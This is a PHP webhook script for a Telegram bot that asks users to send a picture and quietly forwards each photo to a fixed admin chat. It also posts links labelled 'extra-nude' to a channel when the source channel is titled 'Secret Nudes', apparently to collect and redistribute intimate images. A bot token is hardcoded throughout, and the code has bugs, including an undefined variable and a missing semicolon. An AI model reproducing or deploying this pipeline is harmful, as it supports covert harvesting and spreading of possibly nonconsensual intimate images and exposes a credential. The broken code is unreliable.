<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);
$chat_id = $update["message"]["chat"]["id"];
$message = $update["message"]["text"];
$message_id = $update["channel_post"]["message_id"];
$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
$file_id= $update["message"]["photo"]["0"]["file_id"];
$title = $update["channel_post"]["sender_chat"]["title"];
function edit_message($message_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/editMessageCaption?chat_id=@mood4it&message_id=$message_id&caption=join: @mood4it");}
function sendtoadmin($file_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=150681772&photo=$file_id");}
function send_message($chat_id,$message_id, $text){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text");}
function hyperlink($file_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
	$text = "[extra-nude](http://t.me/Thenwordbot?start=$file_id)          join: @mood4it" ;
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=@mood4it&parse_mode=MarkdownV2&text=$text");}
function sendpic($chat_id,$file_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
	file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=$file");}
	
	
edit_message($message_id);
if($message == "/start"){send_message($chat_id,$message_id, "send your pic");}
if( is_null($file_id) != "1" ){send_message($chat_id,$message_id, "done"); sendtoadmin($file_id); }
if($title == "Secret Nudes"){hyperlink($file_id);}
else{ $file = substr($message, 7); sendpic($chat_id,$file) } 
?>
